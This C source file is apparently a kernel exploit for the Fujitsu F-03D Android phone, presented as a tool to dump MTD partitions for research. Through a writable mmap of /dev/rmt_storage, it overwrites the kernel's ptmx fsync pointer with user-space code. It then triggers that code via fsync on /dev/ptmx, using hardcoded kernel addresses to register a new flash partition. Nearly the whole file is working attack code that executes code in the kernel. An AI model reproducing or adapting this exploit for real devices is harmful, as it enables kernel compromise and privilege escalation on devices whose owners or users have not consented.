/*****************************************************************************
 * f03d_dump.c : Dump F-03D MTD partitions for further research.
 *****************************************************************************
 * Copyright (C) 2013 Ming Hu <tewilove@gmail.com>
 * $Id$
 *
 * Authors: Ming Hu <tewilove@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation; either version 2.1 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston MA 02110-1301, USA.
 *****************************************************************************/

#include <android/log.h>

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define LTAG "GUHEIHEI"
#ifndef _NDEBUG
#ifdef BUILD_SHARED_LIBRARY
#define LOGD(fmt, ...) do { __android_log_print(ANDROID_LOG_VERBOSE, LTAG, fmt, ##__VA_ARGS__); } while (0)
#else
#define LOGD(fmt, ...) do { fprintf(stderr, fmt"\n", ##__VA_ARGS__); fflush(stderr); } while (0)
#endif
#else
#define LOGD(fmt, ...)
#endif

static void memsave(const char *f, const void *addr, int size) {
    int fd, n, c, rc;
    
    LOGD("memsave: file = %s, size = %08x", f, size);
    fd = open(f, O_CREAT | O_WRONLY);
    if (fd < 0) {
        LOGD("open() failed: %s.", strerror(errno));
        return;
    }
    n = 0;
    while (n < size) {
        c = size - n;
        if (c > 65536) c = 65536;
        rc = write(fd, (char *) addr + n, size - n);
        if (rc <= 0) break;
        n += rc;
        LOGD("memsave: write %08x.", rc);
    }
    if (n != size)
        LOGD("write() failed: %s.", strerror(errno));
    close(fd);
}

// add_mtd_partitions c02f655c
// dev_get_driver_data c02c76f4
// driver_find c02c803c 
// driver_for_each_device c02c8340

// platform_bus_type c06f75a8

typedef int (*add_mtd_partitions_t)(void *, void *, void *);
static add_mtd_partitions_t my_add_mtd_partitions = (add_mtd_partitions_t) 0xc02f655c;
typedef int (*dev_get_drvdata_t)(void *);
static dev_get_drvdata_t my_dev_get_drvdata = (dev_get_drvdata_t) 0xc02c76f4;
typedef int (*driver_find_t)(void *, void *);
static driver_find_t my_driver_find = (driver_find_t) 0xc02c803c;
typedef int (*driver_for_each_device_t)(void *, void *, void *, void *);
static driver_for_each_device_t my_driver_for_each_device = (driver_for_each_device_t) 0xc02c8340;

#define platform_bus_type 0xc076e720
#define ptmx_fsync 0xc083d564
#define somewherefree  0xc001ff80

struct mtd_partition {
    char *name;         /* identifier string */
    uint64_t size;          /* partition size */
    uint64_t offset;        /* offset within the master MTD space */
    uint32_t mask_flags;        /* master MTD flags to mask out for this partition */
    void *ecclayout;   /* out of band layout for this partition (NAND only) */
};

static struct mtd_partition part[] = {
    {
        .name = (char *) 0xc068f7d8, // "platform"
        .size = 0x5500000,
        .offset = 0,
    }
};

static int my_add_mtd_part(void *arg1, void *arg2) {
    void *mtd;

    mtd = (void *) my_dev_get_drvdata(arg1);
    if (!mtd)
        return -3;
    return my_add_mtd_partitions(mtd, (void *) somewherefree, (void *)(sizeof(part) / sizeof(part[0])));
}

static int my_ptmx_fsync(void *filep, loff_t offset, loff_t nbytes, int flags) {
    void *drv;

    // msm_nand
    drv = (void *) my_driver_find((void *) 0xc065d529, (void *) platform_bus_type);
    if (!drv)
        return -2;
    return my_driver_for_each_device(drv, 0, 0, my_add_mtd_part);
}

int main(int argc, char **argv) {
    int rc, fd_conf, fd_video0;
    unsigned long kaddr, ksize, koffs;
    void *mapped;

    LOGD("start.");
    fd_conf = open("/dev/rmt_storage", O_RDWR);
    if (fd_conf < 0) {
        LOGD("open() failed: %s.", strerror(errno));
        return -1;
    }
    kaddr = 0;
    ksize = 12 * 1024 * 1024;
    koffs = 0x200000;
    mapped = mmap(0, ksize, PROT_READ | PROT_WRITE, MAP_SHARED, fd_conf, kaddr);
    if (mapped == MAP_FAILED) {
        LOGD(" mmap() failed: %s.", strerror(errno));
    }
    // prepare data
    memcpy((char *) mapped + koffs + (somewherefree & 0x00ffffff), part, sizeof(part));
    // modify ptmx_fops
    *((unsigned long *)((char *) mapped + koffs + (ptmx_fsync & 0x00ffffff))) = (unsigned long) my_ptmx_fsync;
    msync(mapped, ksize, 0);
    // trigger
    fd_video0 = open("/dev/ptmx", O_RDWR);
    if (fd_video0 >= 0) {
        rc = fsync(fd_video0);
        close(fd_video0);
    } else {
        LOGD("open() failed: %s.", strerror(errno));
    }
    //memsave("/data/local/tmp/aaa.bin", mapped, ksize);
    munmap(mapped, ksize);
    close(fd_conf);
    LOGD("add = %d.", rc);
    LOGD("exit.");
    return 0;
}
